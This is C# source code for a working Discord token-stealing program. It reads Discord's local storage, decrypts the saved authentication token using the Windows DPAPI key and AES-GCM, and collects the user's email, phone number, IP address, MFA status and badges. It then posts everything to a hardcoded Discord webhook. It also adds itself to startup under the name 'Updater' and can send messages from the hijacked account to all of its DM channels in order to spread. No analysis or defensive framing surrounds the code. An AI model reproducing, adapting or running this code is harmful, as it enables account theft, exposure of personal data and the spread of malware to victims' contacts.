using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Program;

internal static class Program
{
	private static void Main()
	{
		Start();
	}

	private static void SpreadMode(string message)
	{
		string json = SendGet("/users/@me/channels", secret());
		JArray jArray = JArray.Parse(json);
		foreach (dynamic item in jArray)
		{
			Program.Send("/channels/" + item.id + "/messages", "POST", secret(), "{\"content\":\"" + message + "\"}");
			Thread.Sleep(200);
		}
	}

	private static void Send(string endpoint, string method, string auth, string json = null)
	{
		try
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 5000;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10" + endpoint);
			httpWebRequest.Headers.Add("Authorization", auth);
			httpWebRequest.Method = method;
			if (!string.IsNullOrEmpty(json))
			{
				httpWebRequest.ContentType = "application/json";
				using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
				streamWriter.Write(json);
			}
			else
			{
				httpWebRequest.ContentLength = 0L;
			}
			httpWebRequest.GetResponse();
			httpWebRequest.Abort();
		}
		catch
		{
		}
	}

	private static string SendGet(string endpoint, string auth, string method = null, string json = null)
	{
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10" + endpoint);
		httpWebRequest.Headers.Add("Authorization", auth);
		if (string.IsNullOrEmpty(method))
		{
			httpWebRequest.Method = "GET";
		}
		else
		{
			httpWebRequest.Method = method;
		}
		if (!string.IsNullOrEmpty(json))
		{
			httpWebRequest.ContentType = "application/json";
			using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
			streamWriter.Write(json);
		}
		else
		{
			httpWebRequest.ContentLength = 0L;
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string result;
		using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
		{
			result = streamReader.ReadToEnd();
			streamReader.Dispose();
		}
		httpWebRequest.Abort();
		httpWebResponse.Close();
		return result;
	}

	private static void RunOnStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Updater", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void Start()
	{
		try
		{
			string json = SendGet("/users/@me", secret());
			string text = JObject.Parse(json)["id"]!.ToString();
			if (string.IsNullOrEmpty(text))
			{
				text = "N/A";
			}
			string text2 = JObject.Parse(json)["username"]!.ToString();
			if (string.IsNullOrEmpty(text2))
			{
				text2 = "N/A";
			}
			string text3 = JObject.Parse(json)["discriminator"]!.ToString();
			if (string.IsNullOrEmpty(text3))
			{
				text3 = "N/A";
			}
			string text4 = JObject.Parse(json)["flags"]!.ToString();
			string text5 = "";
			if (text4 == "1")
			{
				text5 += "Discord Employee, ";
			}
			if (text4 == "2")
			{
				text5 += "Partnered Server Owner, ";
			}
			if (text4 == "4")
			{
				text5 += "HypeSquad Events Member, ";
			}
			if (text4 == "8")
			{
				text5 += "Bug Hunter Level 1, ";
			}
			if (text4 == "64")
			{
				text5 += "House Bravery Member, ";
			}
			if (text4 == "128")
			{
				text5 += "House Brilliance Member, ";
			}
			if (text4 == "256")
			{
				text5 += "House Balance Member, ";
			}
			if (text4 == "512")
			{
				text5 += "Early Nitro Supporter, ";
			}
			if (text4 == "16384")
			{
				text5 += "Bug Hunter Level 2, ";
			}
			if (text4 == "131072")
			{
				text5 += "Early Verified Bot Developer, ";
			}
			if (string.IsNullOrEmpty(text5))
			{
				text5 = "N/A";
			}
			string text6 = JObject.Parse(json)["email"]!.ToString();
			if (string.IsNullOrEmpty(text6))
			{
				text6 = "N/A";
			}
			string text7 = JObject.Parse(json)["phone"]!.ToString();
			if (string.IsNullOrEmpty(text7))
			{
				text7 = "N/A";
			}
			string text8 = JObject.Parse(json)["bio"]!.ToString();
			if (string.IsNullOrEmpty(text8))
			{
				text8 = "N/A";
			}
			string text9 = JObject.Parse(json)["locale"]!.ToString();
			if (string.IsNullOrEmpty(text9))
			{
				text9 = "N/A";
			}
			string text10 = JObject.Parse(json)["mfa_enabled"]!.ToString();
			if (string.IsNullOrEmpty(text10))
			{
				text10 = "N/A";
			}
			string text11 = JObject.Parse(json)["avatar"]!.ToString();
			string field = ((!string.IsNullOrEmpty(text11)) ? ("https://cdn.discordapp.com/avatars/" + text + "/" + text11 + ".webp") : "N/A");
			string json2 = SendGet("/users/@me/settings", secret());
			string text12 = JObject.Parse(json2)["status"]!.ToString();
			if (string.IsNullOrEmpty(text12))
			{
				text12 = "N/A";
			}
			DiscordEmbed("New account from " + text2 + "#" + text3, "1018364", text, text6, text7, text8, text9, text5, text10, text12, field, I(), secret());
		}
		catch
		{
		}
	}

	private static string I()
	{
		string text = "";
		try
		{
			WebClient webClient = new WebClient();
			webClient.Proxy = null;
			return webClient.DownloadString("http://icanhazip.com/").Trim();
		}
		catch
		{
			return "N/A";
		}
	}

	private static string secret()
	{
		string result = "";
		Regex regex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
		string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string fileName in array)
		{
			FileInfo fileInfo = new FileInfo(fileName);
			string input = File.ReadAllText(fileInfo.FullName);
			Match match = regex.Match(input);
			if (match.Success)
			{
				result = secret3(Convert.FromBase64String(match.Value.Split(new string[1] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
			}
		}
		return result;
	}

	private static byte[] secret4(string path)
	{
		dynamic val = JsonConvert.DeserializeObject(File.ReadAllText(path));
		return ProtectedData.Unprotect(Convert.FromBase64String((string)val.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
	}

	private static string secret3(byte[] buffer)
	{
		byte[] array = buffer.Skip(15).ToArray();
		AeadParameters parameters = new AeadParameters(new KeyParameter(secret4(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
		GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
		gcmBlockCipher.Init(forEncryption: false, parameters);
		byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
		gcmBlockCipher.DoFinal(array2, gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0));
		return Encoding.UTF8.GetString(array2).TrimEnd("\r\n\0".ToCharArray());
	}

	private static void DiscordEmbed(string title, string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8, string field9, string field10, string field11)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create("https://discord.com/api/webhooks/1007363061608362076/6Trk5IL6IFjtrs88ykexS8UFDehzfwZQVI8ikfa3VlKA1tcv7Gn7HaSRO5Ex147XNJ1a");
			webRequest.ContentType = "application/json";
			webRequest.Method = "POST";
			using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
			{
				streamWriter.Write("{\"username\":\"StupidBot\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Biography\",\"value\":\"" + field4 + "\"},{\"name\":\"Locale\",\"value\":\"" + field5 + "\"},{\"name\":\"Badges\",\"value\":\"" + field6 + "\"},{\"name\":\"2FA Enabled\",\"value\":\"" + field7 + "\"},{\"name\":\"Status\",\"value\":\"" + field8 + "\"},{\"name\":\"Avatar\",\"value\":\"" + field9 + "\"},{\"name\":\"IP Address\",\"value\":\"" + field10 + "\"},{\"name\":\"Discord Token\",\"value\":\"" + field11 + "\"}]}]}");
			}
			webRequest.GetResponse();
		}
		catch
		{
		}
	}
}
